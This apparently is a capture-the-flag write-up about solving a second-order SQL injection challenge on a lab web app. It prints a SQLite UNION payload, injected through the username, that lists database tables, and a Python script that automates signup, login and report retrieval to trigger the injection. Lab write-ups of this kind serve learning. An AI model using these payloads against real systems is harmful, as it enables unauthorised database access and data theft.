---
title: ORDER ORDER
date: 2026-11-25
categories: [web]
tags: [cylab, sqli]
ctf_author: Darkraicg492
ctf_author_url: "https://hackerone.com/gauravcg492"
description: "This challenge had a hint What does order in SQL Injection mean?. We tried running SQLmap on the login and signup page but nothing stood out. Went about it…"
toc: true
math: false
layout: post
---

# ORDER ORDER

## Recon

This challenge had a hint `What does order in SQL Injection mean?`. We tried running [SQLmap](https://sqlmap.org/) on the login and signup page but nothing stood out. Went about it once we logged in by trying to inject `sql` into other fields but nothing came about. Now, the name is a hint itself, `ORDER ORDER` can be interpreted as `second order(SQLi)`. 
## Solving it

You create a username that has SQL injection in it. The injection doesn't get reflected immediately until you try to generate a report. The username itself is used in the query to generate the report which directly copies the username in it so we can use that.

*The.*

We then tried some other styles of SQLi, depending on the backend (we were kind of guessing) but we hit with the SQLite format being:
```
admin' OR 1=1 UNION SELECT tbl_name,NULL,NULL FROM sqlite_master WHERE type='table'-- -
```
This gave us the various table names, and one was named in some sort of encoding. Naturally we look at its contents by looking at the name and value fields and find the flag!

Here's a quick automation script we decided to write:

```python
import requests
import time
import secrets
import sys

payload = sys.argv[1]

url = "http://chatelaine.cylabacademy.net:33259"
username = payload + secrets.token_hex(8)
email = f"{secrets.token_hex(8)}@asd.asd"
password = "asdasdasd"

data = {
    'username': username,
    'email': email,
    'password': password,
    'action': '',
}

r = requests.post(f'{url}/signup', data=data, verify=False)
r = requests.post(f'{url}/login', data=data, verify=False)

cookies = {"session": r.cookies["session"]}

r = requests.post(f'{url}/generate_report', cookies=cookies, verify=False)

time.sleep(11)

r = requests.get(f'{url}/inbox', cookies=cookies, verify=False)


o = r.text
i = o.split('<a href="/download_report/')[1].split('"')[0]

r = requests.get(f'{url}/download_report/{i}', cookies=cookies, verify=False)

print(r.text)
```

![automate](/assets/img/inbox/automate.jpg)

<details markdown="1">
<summary>Flag</summary>

academy{...}

</details>
